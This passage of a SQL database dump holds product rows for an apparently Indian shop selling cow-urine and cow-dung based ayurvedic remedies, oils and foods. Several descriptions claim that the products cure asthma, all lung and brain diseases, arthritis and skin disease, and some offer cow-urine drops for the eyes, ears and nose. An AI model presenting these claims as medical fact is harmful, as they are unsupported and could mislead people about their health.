(181, 249, 'GGA-SA-G-005', 800, 800, 10, '<p>Removes dead skin cells and helps retain the naturally soft feel of your skin.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Pancha Gavya, Multani Mitti</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '108', 0, 0, '', '', '', '', 0, '2022-02-16 09:30:55', '2022-03-30 10:07:33', '<p>Dosage: Use it with water while taking bath, or at any suitable time of the day or as directed by Gavya siddh.</p>\r\n', '', ''),
(182, 249, 'GGA-SA-S-005', 800, 780, 10, '<p>Removes dead skin cells and helps retain the naturally soft feel of your skin.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Pancha Gavya, Multani Mitti</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '108', 0, 0, '', '', '', '', 0, '2022-02-16 09:30:55', '2022-03-30 06:05:40', '<p>Dosage: Use it with water while taking bath, or at any suitable time of the day or as directed by Gavya siddh.</p>\r\n', '', ''),
(183, 249, 'GGA-SA-N-005', 780, 750, 10, '<p>Removes dead skin cells and helps retain the naturally soft feel of your skin.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Pancha Gavya, Multani Mitti</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '108', 0, 0, '', '', '', '', 0, '2022-02-16 09:30:55', '2022-03-30 06:05:40', '<p>Dosage: Use it with water while taking bath, or at any suitable time of the day or as directed by Gavya siddh.</p>\r\n', '', ''),
(184, 250, 'GGA-SA-G-006', 750, 750, 10, '<p>Medicine for acne, pimple, and all face skin-related problems. It helps in removing black spots and pimples.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Butter, Pancha Gavya, Multani Mitti</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '106', 1, 0, '', '', '', '', 0, '2022-02-16 09:35:29', '2022-03-30 11:46:38', '<p>Dosage: For oily skin use it with milk and for dry skin use it with water before going to bed or on any suitable time or as directed by gavya siddh.</p>\r\n', '', ''),
(185, 250, 'GGA-SA-S-006', 720, 700, 10, '<p>Medicine for acne, pimple, and all face skin-related problems. It helps in removing black spots and pimples.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Butter, Pancha Gavya, Multani Mitti</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '106', 0, 0, '', '', '', '', 0, '2022-02-16 09:35:29', '2022-03-30 11:46:38', '<p>Dosage: For oily skin use it with milk and for dry skin use it with water before going to bed or on any suitable time or as directed by gavya siddh.</p>\r\n', '', ''),
(186, 250, 'GGA-SA-N-006', 700, 680, 10, '<p>Medicine for acne, pimple, and all face skin-related problems. It helps in removing black spots and pimples.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Butter, Pancha Gavya, Multani Mitti</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '106', 0, 0, '', '', '', '', 0, '2022-02-16 09:35:29', '2022-03-30 11:46:38', '<p>Dosage: For oily skin use it with milk and for dry skin use it with water before going to bed or on any suitable time or as directed by gavya siddh.</p>\r\n', '', ''),
(187, 251, 'GGA-TL-G-001', 150, 150, 10, '<p>Helps in treating conditions like&nbsp;acne,&nbsp;wrinkles,&nbsp;and other skin diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomayadi malam</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 0, 0, '', '', '', '', 0, '2022-02-16 09:45:22', '2022-03-30 07:35:31', '<p>Dosage: Spray /apply on the affected area.</p>\r\n', '', ''),
(188, 251, 'GGA-TL-S-001', 130, 130, 10, '<p>Helps in treating conditions like&nbsp;acne,&nbsp;wrinkles,&nbsp;and other skin diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomayadi malam</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-16 09:45:22', '2022-03-30 07:35:31', '<p>Dosage: Spray /apply on the affected area.</p>\r\n', '', ''),
(189, 251, 'GGA-TL-N-001', 100, 100, 10, '<p>Helps in treating conditions like&nbsp;acne,&nbsp;wrinkles,&nbsp;and other skin diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomayadi malam</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '110', 0, 0, '', '', '', '', 0, '2022-02-16 09:45:22', '2022-03-30 07:35:31', '<p>Dosage: Spray /apply on the affected area.</p>\r\n', '', ''),
(190, 252, 'GGA-TL-G-002', 200, 200, 10, '<p>For treating arthritis, Back Pains, Spondilties, Joints Pain.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthra, Gomaya Rasa, Gingelly Oil, Ajawan Satwa, Pacha Karpoora Ashwagandha, Nilagiri Thaila, Tulasi Thaila, Pudina Thaila, Lavanga Thaila, Shanka Pushpi, Datthoora, Hutjode, Nirgundi &amp; other herbs.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '81', 0, 0, '', '', '', '', 0, '2022-02-16 09:52:47', '2022-03-30 07:34:35', '<p>Dosage: Apply 15 to 20 drops of oil &amp; gently rub it up to form heat at the affected area.</p>\r\n', '', ''),
(191, 252, 'GGA-TL-S-002', 150, 150, 10, '<p>For treating arthritis, Back Pains, Spondilties, Joints Pain.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthra, Gomaya Rasa, Gingelly Oil, Ajawan Satwa, Pacha Karpoora Ashwagandha, Nilagiri Thaila, Tulasi Thaila, Pudina Thaila, Lavanga Thaila, Shanka Pushpi, Datthoora, Hutjode, Nirgundi &amp; other herbs.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '81', 0, 0, '', '', '', '', 0, '2022-02-16 09:52:47', '2022-03-30 07:34:35', '<p>Dosage: Apply 15 to 20 drops of oil &amp; gently rub it up to form heat at the affected area.</p>\r\n', '', ''),
(192, 252, 'GGA-TL-N-002', 130, 130, 10, '<p>For treating arthritis, Back Pains, Spondilties, Joints Pain.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthra, Gomaya Rasa, Gingelly Oil, Ajawan Satwa, Pacha Karpoora Ashwagandha, Nilagiri Thaila, Tulasi Thaila, Pudina Thaila, Lavanga Thaila, Shanka Pushpi, Datthoora, Hutjode, Nirgundi &amp; other herbs.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '81', 0, 0, '', '', '', '', 0, '2022-02-16 09:52:47', '2022-03-30 07:34:35', '<p>Dosage: Apply 15 to 20 drops of oil &amp; gently rub it up to form heat at the affected area.</p>\r\n', '', ''),
(193, 253, 'GGA-TL-G-003', 200, 185, 10, '<p>It helps to cure asthma, anti-snoring, sinus, breathing problems, bronchitis, all types of lung disease, brain diseases &amp; nose allergies.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Desi Gomatha Gomuthra, Gomaya Ras, Ghritha, Ksheera, Takra, processed in sunlight, added with Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '111', 0, 0, '', '', '', '', 0, '2022-02-16 09:57:43', '2022-03-30 06:02:26', '<p>Dosage: Insert dropper a little way into the nostril and squeeze bulb gently to release the required number of drops. Repeat in other nostrils.</p>\r\n', '', ''),
(194, 253, 'GGA-TL-S-003', 180, 180, 10, '<p>It helps to cure asthma, anti-snoring, sinus, breathing problems, bronchitis, all types of lung disease, brain diseases &amp; nose allergies.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Desi Gomatha Gomuthra, Gomaya Ras, Ghritha, Ksheera, takra, processed in sunlight, added with Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '111', 0, 0, '', '', '', '', 0, '2022-02-16 09:57:43', '2022-03-30 06:02:26', '<p>Dosage: Insert dropper a little way into the nostril and squeeze bulb gently to release the required number of drops. Repeat in other nostrils.</p>\r\n', '', ''),
(195, 253, 'GGA-TL-N-003', 150, 150, 10, '<p>It helps to cure asthma, anti-snoring, sinus, breathing problems, bronchitis, all types of lung disease, brain diseases &amp; nose allergies.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Desi Gomatha Gomuthra, Gomaya Ras, Ghritha, Ksheera, Takra, processed in Sunlight, added with Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '111', 0, 0, '', '', '', '', 0, '2022-02-16 09:57:43', '2022-03-30 06:02:26', '<p>Dosage: Insert dropper a little way into the nostril and squeeze bulb gently to release the required number of drops. Repeat in other nostrils.</p>\r\n', '', ''),
(196, 254, 'GGA-TL-G-004', 200, 150, 10, '<p>Use full for Protection of healthy eyes.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharathiya Gomatha&#39;s Gomuthra, pure Rose Water, Pure Small Bee&#39;s Honey.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:03:42', '2022-03-30 06:00:28', '<p>Dosage: Use only as directed by Ghavyasidha Vaidhya.</p>\r\n', '', ''),
(197, 254, 'GGA-TL-S-004', 150, 150, 10, '<p>Use full for Protection of healthy eyes.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharathiya Gomatha&#39;s Gomuthra, pure Rose Water, Pure Small Bee&#39;s Honey.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:03:42', '2022-03-30 06:00:28', '<p>Dosage: Use only as directed by Ghavyasidha Vaidhya.</p>\r\n', '', ''),
(198, 254, 'GGA-TL-N-004', 150, 145, 10, '<p>Use full for Protection of healthy eyes.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharathiya Gomatha&#39;s Gomuthra, pure Rose Water, Pure Small Bee&#39;s Honey.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:03:42', '2022-03-30 06:00:28', '<p>Dosage: Use only as directed by Ghavyasidha Vaidhya.</p>\r\n', '', ''),
(199, 255, 'GGA-TL-G-005', 200, 200, 10, '<p>Use full for protection of healthy ear.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharathiya Gomatha&#39;s Gomuthra processed.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:08:57', '2022-03-30 05:59:11', '<p>Dosage: Use only as directed by Ghavyasidha Vaidhya.</p>\r\n', '', ''),
(200, 255, 'GGA-TL-S-005', 150, 150, 10, '<p>Use full for protection of healthy ear.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharathiya Gomatha&#39;s Gomuthra processed.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:08:57', '2022-03-30 05:59:11', '<p>Dosage: Use only as directed by Ghavyasidha Vaidhya.</p>\r\n', '', ''),
(201, 255, 'GGA-TL-N-005', 150, 140, 10, '<p>Use full for protection of healthy ear.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bharathiya Gomatha&#39;s Gomuthra processed.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:08:57', '2022-03-30 05:59:11', '<p>Dosage: Use only as directed by Ghavyasidha Vaidhya.</p>\r\n', '', ''),
(202, 256, 'GGA-TL-G-006', 200, 180, 10, '<p>Helps in treating skin allergies &amp; diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthram, Gomarasam, Neem, Ashwagandhi.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 0, 0, '', '', '', '', 0, '2022-02-16 10:13:21', '2022-03-30 07:20:11', '<p>Dosage: Apply twice a day on the affected area.</p>\r\n', '', ''),
(203, 256, 'GGA-TL-S-006', 170, 170, 10, '<p>Helps in treating skin allergies &amp; diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthram, Gomarasam, Neem, Ashwagandhi.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '83', 0, 0, '', '', '', '', 0, '2022-02-16 10:13:21', '2022-03-30 07:20:11', '<p>Dosage: Apply twice a day on the affected area.</p>\r\n', '', ''),
(204, 256, 'GGA-TL-N-006', 170, 150, 10, '<p>Helps in treating skin allergies &amp; diseases.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Gomuthram, Gomarasam, Neem, Ashwagandhi.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '75', 0, 0, '', '', '', '', 0, '2022-02-16 10:13:21', '2022-03-30 07:20:11', '<p>Dosage: Apply twice a day on the affected area.</p>\r\n', '', ''),
(205, 257, 'GGA-TL-G-007', 450, 420, 10, '<p>Helps in mind cooling &amp; relief from headaches, healthy sleep, migraine, sinus, stress.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriendar, Nilgiri, Rose mary, Lavendar, Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '81', 1, 0, '', '', '', '', 0, '2022-02-16 10:19:04', '2022-03-30 07:33:08', '<p>Dosage: Apply twice a day, or as directed by Ayurvedic doctor.</p>\r\n', '', ''),
(206, 257, 'GGA-TL-S-007', 420, 400, 10, '<p>Helps in mind cooling &amp; relief from headaches, healthy sleep, migraine, sinus, stress.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriendar, Nilgiri, Rose mary, Lavendar, Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '81', 0, 0, '', '', '', '', 0, '2022-02-16 10:19:04', '2022-03-30 07:33:08', '<p>Dosage: Apply twice a day, or as directed by Ayurvedic doctor.</p>\r\n', '', ''),
(207, 257, 'GGA-TL-N-007', 350, 320, 10, '<p>Helps in mind cooling &amp; relief from headaches, healthy sleep, migraine, sinus, stress.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriendar, Nilgiri, Rose mary, Lavendar, Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '81', 0, 0, '', '', '', '', 0, '2022-02-16 10:19:04', '2022-03-30 07:33:08', '<p>Dosage: Apply twice a day, or as directed by Ayurvedic doctor.</p>\r\n', '', ''),
(208, 258, 'GGA-TL-G-008', 300, 300, 10, '<p>Helps in relief from headache &amp; cold.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriendar, Nilgiri, Rose mary, Lavendar, Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '79', 1, 0, '', '', '', '', 0, '2022-02-16 10:23:44', '2022-03-30 07:32:24', '<p>&nbsp;Dosage: Apply twice a day , or as directed by Ayurvedic doctor.</p>\r\n', '', ''),
(209, 258, 'GGA-TL-S-008', 250, 250, 10, '<p>Helps in relief from headache &amp; cold.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriendar, Nilgiri, Rose mary, Lavendar, Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:23:44', '2022-03-30 07:32:24', '<p>&nbsp;Dosage: Apply twice a day , or as directed by Ayurvedic doctor.</p>\r\n', '', ''),
(210, 258, 'GGA-TL-N-008', 220, 220, 10, '<p>Helps in relief from headache &amp; cold.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriendar, Nilgiri, Rose mary, Lavendar, Amrithdhara.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>&nbsp;</strong></p>\r\n', '', '', '', 3, '79', 0, 0, '', '', '', '', 0, '2022-02-16 10:23:44', '2022-03-30 07:32:24', '<p>&nbsp;Dosage: Apply twice a day , or as directed by Ayurvedic doctor.</p>\r\n', '', ''),
(211, 259, 'GGA-TL-G-009', 900, 850, 10, '<p>Use full in asthma, sinus, breathing problems, bronchitis, lungs, brain, cold, nose allergies.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriander, Nilgiri, Rose Mary, Lavendar, Amrithdhara.</p>\r\n', '', '', '', 1, '112', 1, 1, '', '', '', '', 0, '2022-02-16 10:27:27', '2022-03-30 10:17:57', '', '', ''),
(212, 259, 'GGA-TL-S-009', 850, 850, 10, '<p>Use full in asthma, sinus, breathing problems, bronchitis, lungs, brain, cold, nose allergies.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriander, Nilgiri, Rose Mary, Lavendar, Amrithdhara.</p>\r\n', '', '', '', 2, '112', 0, 0, '', '', '', '', 0, '2022-02-16 10:27:27', '2022-03-30 10:17:57', '', '', ''),
(213, 259, 'GGA-TL-N-009', 700, 700, 10, '<p>Use full in asthma, sinus, breathing problems, bronchitis, lungs, brain, cold, nose allergies.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Ghritha, Tulsi, Turmeric, Clove, Nutmug, Pepper, Coriander, Nilgiri, Rose Mary, Lavendar, Amrithdhara.</p>\r\n', '', '', '', 3, '112', 0, 0, '', '', '', '', 0, '2022-02-16 10:27:27', '2022-03-30 10:17:57', '', '', ''),
(214, 260, 'GGA-TL-G-010', 850, 800, 10, '<p>Improves skin texture and adds radiance while relieving aching joints and removing toxins through the skin.&nbsp;It is excellent for body &amp; head massage</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bhartiya Gomatha&#39;s Gritha, Gomutra, Takra, Gomayarasa, Ksheera, Til, Coconut, Mustard, Castrol &amp; Lemon Oils</p>\r\n', '', '', '', 1, '75', 1, 0, '', '', '', '', 0, '2022-02-16 10:31:55', '2022-03-30 05:46:13', '', '', ''),
(215, 260, 'GGA-TL-S-010', 750, 750, 10, '<p>Improves skin texture and adds radiance while relieving aching joints and removing toxins through the skin.&nbsp;It is excellent for body &amp; head massage</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bhartiya Gomatha&#39;s Gritha, Gomutra, Takra, Gomayarasa, Ksheera, Til, Coconut, Mustard, Castrol &amp; Lemon Oils</p>\r\n', '', '', '', 2, '75', 0, 0, '', '', '', '', 0, '2022-02-16 10:31:55', '2022-03-30 05:46:13', '', '', ''),
(216, 260, 'GGA-TL-N-010', 600, 600, 10, '<p>Improves skin texture and adds radiance while relieving aching joints and removing toxins through the skin.&nbsp;It is excellent for body &amp; head massage</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Bhartiya Gomatha&#39;s Gritha, Gomutra, Takra, Gomayarasa, Ksheera, Til, Coconut, Mustard, Castrol &amp; Lemon Oils</p>\r\n', '', '', '', 3, '75', 0, 0, '', '', '', '', 0, '2022-02-16 10:31:56', '2022-03-30 05:46:13', '', '', ''),
(217, 261, 'GGA-PA-G-001', 400, 400, 10, '<p>Made from pure desi cow milk, 100% pure &amp; healthy, natural taste. Made by Vedic method. Boosts immunity</p>\r\n', '', '', '', 1, '113', 0, 0, '', '', '', '', 0, '2022-02-16 10:44:10', '2022-03-30 05:45:27', '', '', ''),
(218, 261, 'GGA-PA-S-001', 350, 300, 10, '<p>Made from pure desi cow milk, 100% pure &amp; healthy, natural taste. Made by Vedic method. Boosts immunity</p>\r\n', '', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-16 10:44:10', '2022-03-30 05:45:27', '', '', ''),
(219, 261, 'GGA-PA-N-001', 250, 250, 10, '<p>Made from pure desi cow milk, 100% pure &amp; healthy, natural taste. Made by the Vedic method. Boosts immunity</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-16 10:44:10', '2022-03-30 05:45:27', '', '', ''),
(220, 262, 'GGA-PA-G-002', 150, 150, 10, '<p>Helps in activating organs, better digestion, immunity boosts, weight loss, reduced stress, and healthy skin. It has low iodine and adding this to your diet will give you a healthier meal as well as a healthier lifestyle.</p>\r\n', '', '', '', 1, '113', 0, 0, '', '', '', '', 0, '2022-02-16 10:48:18', '2022-03-30 05:44:30', '', '', ''),
(221, 262, 'GGA-PA-S-002', 150, 150, 10, '<p>Helps in activating organs, better digestion, immunity boosts, weight loss, reduced stress, and healthy skin. It has low iodine and adding this to your diet will give you a healthier meal as well as a healthier lifestyle.</p>\r\n', '', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-16 10:48:18', '2022-03-30 05:44:30', '', '', ''),
(222, 262, 'GGA-PA-N-002', 150, 150, 10, '<p>Helps in activating organs, better digestion, immunity boosts, weight loss, reduced stress, and healthy skin. It has low iodine and adding this to your diet will give you a healthier meal as well as a healthier lifestyle.</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-16 10:48:18', '2022-03-30 05:44:30', '', '', ''),
(223, 263, 'GGA-PA-G-003', 250, 250, 10, '<p>The best-known health benefit of turmeric is its anti-inflammatory and antioxidant properties, which reduce swelling and pain in conditions such as arthritis. Turmeric is used for arthritis, heartburn (dyspepsia), joint pain, stomach pain, ulcerative colitis, bypass surgery, intestinal gas, stomach bloating, loss of appetite, jaundice, liver problems.&nbsp;</p>\r\n', '', '', '', 1, '107', 0, 0, '', '', '', '', 0, '2022-02-16 10:54:56', '2022-03-30 05:43:40', '', '', ''),
(224, 263, 'GGA-PA-S-003', 200, 150, 10, '<p>The best-known health benefit of turmeric is its anti-inflammatory and antioxidant properties, which reduce swelling and pain in conditions such as arthritis. Turmeric is used for arthritis, heartburn (dyspepsia), joint pain, stomach pain, ulcerative colitis, bypass surgery, intestinal gas, stomach bloating, loss of appetite, jaundice, liver problems.&nbsp;</p>\r\n', '', '', '', 2, '107', 0, 0, '', '', '', '', 0, '2022-02-16 10:54:56', '2022-03-30 05:43:40', '', '', ''),
(225, 263, 'GGA-PA-N-003', 150, 150, 10, '<p>The best-known health benefit of turmeric is its anti-inflammatory and antioxidant properties, which reduce swelling and pain in conditions such as arthritis. Turmeric is used for arthritis, heartburn (dyspepsia), joint pain, stomach pain, ulcerative colitis, bypass surgery, intestinal gas, stomach bloating, loss of appetite, jaundice, liver problems.&nbsp;</p>\r\n', '', '', '', 3, '107', 0, 0, '', '', '', '', 0, '2022-02-16 10:54:57', '2022-03-30 05:43:40', '', '', ''),
(226, 264, 'GGA-PA-G-004', 650, 650, 10, '<p>Cold Pressed Groundnut oil is rich in nutrients, which makes the oil rich in&nbsp;antioxidants and full of nutrition - Free from chemicals -Obtain through traditional method. Groundnut oil is a rich source of minerals and vitamins which help in regulating metabolism, converting fat and carbohydrates into energy, and facilitating bone and tissue formation.</p>\r\n\r\n<ul>\r\n	<li>100% organic, natural, tasty, and healthy cooking oil.</li>\r\n	<li>No chemicals, No heat process, No preservatives.</li>\r\n</ul>\r\n\r\n<p><strong>Nutritional facts:</strong></p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fats, Protein,&nbsp;Dietary Fiber,&nbsp;Vitamin E,&nbsp;Zinc</p>\r\n', '', '', '', 1, '114', 1, 0, '', '', '', '', 0, '2022-02-16 10:59:48', '2022-03-30 09:43:15', '', '', ''),
(227, 264, 'GGA-PA-S-004', 550, 550, 10, '<p>Cold Pressed Groundnut oil is rich in nutrients, which makes the oil rich in&nbsp;antioxidants and full of nutrition - Free from chemicals -Obtain through traditional method. Groundnut oil is a rich source of minerals and vitamins which help in regulating metabolism, converting fat and carbohydrates into energy, and facilitating bone and tissue formation.</p>\r\n\r\n<ul>\r\n	<li>100% organic, natural, tasty, and healthy cooking oil.</li>\r\n	<li>No chemicals, No heat process, No preservatives.</li>\r\n</ul>\r\n\r\n<p><strong>Nutritional facts:</strong></p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fats, Protein,&nbsp;Dietary Fiber,&nbsp;Vitamin E,&nbsp;Zinc</p>\r\n', '', '', '', 2, '114', 0, 0, '', '', '', '', 0, '2022-02-16 10:59:48', '2022-03-30 09:43:15', '', '', ''),
(228, 264, 'GGA-PA-N-004', 500, 500, 10, '<p>Cold Pressed Groundnut oil is rich in nutrients, which makes the oil rich in&nbsp;antioxidants and full of nutrition - Free from chemicals -Obtain through traditional method. Groundnut oil is a rich source of minerals and vitamins which help in regulating metabolism, converting fat and carbohydrates into energy, and facilitating bone and tissue formation.</p>\r\n\r\n<ul>\r\n	<li>100% organic, natural, tasty, and healthy cooking oil.</li>\r\n	<li>No chemicals, No heat process, No preservatives.</li>\r\n</ul>\r\n\r\n<p><strong>Nutritional facts:</strong></p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fats, Protein,&nbsp;Dietary Fiber,&nbsp;Vitamin E,&nbsp;Zinc</p>\r\n', '', '', '', 3, '114', 0, 0, '', '', '', '', 0, '2022-02-16 10:59:48', '2022-03-30 09:43:15', '', '', ''),
(229, 265, 'GGA-PA-G-005', 500, 500, 10, '<p>Unrefined cold-pressed coconut oil is useful for weight loss, hair, skin, and cooking. It contains short and medium-chain fatty acids that help in taking off excessive weight.&nbsp;</p>\r\n\r\n<ul>\r\n	<li>100% organic, natural, tasty, and healthy cooking oil.</li>\r\n	<li>No chemicals, No heat process, No preservatives.</li>\r\n</ul>\r\n\r\n<p><strong>Nutritional Facts:</strong></p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fatty Acids, Vitamin E, Vitamin K,&nbsp;Phytosterols.</p>\r\n', '', '', '', 1, '110', 1, 0, '', '', '', '', 0, '2022-02-16 11:05:23', '2022-03-30 07:29:27', '', '', ''),
(230, 265, 'GGA-PA-S-005', 450, 450, 10, '<p>Unrefined cold-pressed coconut oil is useful for weight loss, hair, skin, and cooking. It contains short and medium-chain fatty acids that help in taking off excessive weight.&nbsp;</p>\r\n\r\n<ul>\r\n	<li>100% organic, natural, tasty, and healthy cooking oil.</li>\r\n	<li>No chemicals, No heat process, No preservatives.</li>\r\n</ul>\r\n\r\n<p><strong>Nutritional Facts:</strong></p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fatty Acids, Vitamin E, Vitamin K,&nbsp;Phytosterols.</p>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:05:23', '2022-03-30 07:29:27', '', '', ''),
(231, 265, 'GGA-PA-N-005', 430, 430, 10, '<p>Unrefined cold-pressed coconut oil is useful for weight loss, hair, skin, and cooking. It contains short and medium-chain fatty acids that help in taking off excessive weight.&nbsp;</p>\r\n\r\n<ul>\r\n	<li>100% organic, natural, tasty, and healthy cooking oil.</li>\r\n	<li>No chemicals, No heat process, No preservatives.</li>\r\n</ul>\r\n\r\n<p><strong>Nutritional Facts:</strong></p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fatty Acids, Vitamin E, Vitamin K,&nbsp;Phytosterols.</p>\r\n', '', '', '', 3, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:05:23', '2022-03-30 07:29:27', '', '', '');
INSERT INTO `productpackage` (`id`, `pid`, `pcode`, `mrp`, `sellingprice`, `stock`, `overview`, `mdesc`, `sname`, `svalue`, `package_id`, `psize`, `home_page`, `bundle_products`, `thumbimg`, `simg`, `mimg`, `limg`, `status`, `created_date`, `modified_date`, `how_to_use`, `youtube`, `youtubelink`) VALUES
